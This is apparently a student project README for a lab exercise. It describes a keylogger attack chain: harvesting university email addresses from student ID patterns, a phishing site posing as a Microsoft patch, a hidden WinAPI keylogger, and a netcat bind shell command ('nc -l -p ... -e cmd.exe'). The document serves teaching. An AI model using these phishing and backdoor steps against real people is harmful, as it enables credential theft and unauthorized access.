# keylogger

Disclaimer: This project is for educational purposes only. 

The project consists of three stages, reconnaissance, phishing, and attack, respectively. You can check the [slide](https://docs.google.com/presentation/d/1gPKOFa4L5iZNUBC93aRHLyo68CuBljt5r5G959ol310/edit?usp=sharing) and [demo video](https://drive.google.com/file/d/1p_wR3EA5aYX3AFgCXlgbovBPu3-YU2k-/view?usp=sharing) for the further information. During the reconnaissance stage, the attacker collects target email addresses and uses ARP scan to obtain target IPs. Next, during the phishing stage, the attacker sends phishing emails that contain the link of the phishing website (fake Microsoft website in our case) to the victims. The downloader in the phishing website will redirect to the link of malware. If the victims follow the instructions, that is, download and run the .bat file (contains malware actually), the executable will start logging the keystrokes and create a backdoor shell. So the attacker can use the backdoor to retrieve a log file that contains some sensitive data. 

[arch]



## Requirement

- Virtualbox 5.2.18
- Kali Linux 64-bit VM
- Windows Server 2016 VM, which security protection is disabled (i.e., no firewall and antivirus software)
- Visual Studio C++ build tools 
- Netcat 



## How to use

### Recon

1. Target email addresses: According to the NCKU student ID number rule, we can collect a number of email addresses. Take a quick example, the student ID number which starts with "F7409" means the student majors in computer science and is enrolled in 2020. 

2. Target IPs: Since the attacker and victims are in the same subnet, we can use the `arp-scan` command in the Kali machine to execute the scanning, then parse the information to get target IPs. 

   ```
   $ sudo arp-scan -local 
   ```

### Phishing 

Microsoft exchange server vulnerability is one of the serious issues in 2021. Microsoft then released the patches to tackle the vulnerability. Our idea is to create a fake Microsoft patching website and cheat the victims to download the fake patch, which is malware actually.  

1. Phishing email: Warn the victims there may be a Microsoft exchange server vulnerability in his/her computer and lead the victims to access the phishing website. 

2. Phishing website: Use DriveToWeb service to host the phishing website, which is the same as the Microsoft official patching website, except for the instructions and the downloader. 

### Keylogger

The keylogger is based on Windows programming with C++. The keylogger keeps tracking keystrokes with the WinAPI `GetAsyncKeyState()` and logging the typed information as a file. Besides, the keylogger is hidden from the taskbar with the WinAPI `ShowWindow()` and the parameter `SW_HIDE`. For detailed information, please check the Windows app developer documentation. 

### Backdoor shell

Netcat is a useful networking tool. However, it is not secure. In our case, we use Netcat to create a backdoor shell. So we can retrieve the logging file which contains some sensitive information. 

1. Victim

   ```
   $ nc -l -p <port number> -t -e cmd.exe
   ```

2. Attacker

   ```
   $ nc <victim IP> <port number>
   ```

   

## Result

Here is some snapshots. 

Create the phishing website (right). 



Launch the keylogging attack successfully. 

![](https://github.com/chuang76/keylogger/blob/main/figure/result.png?raw=true)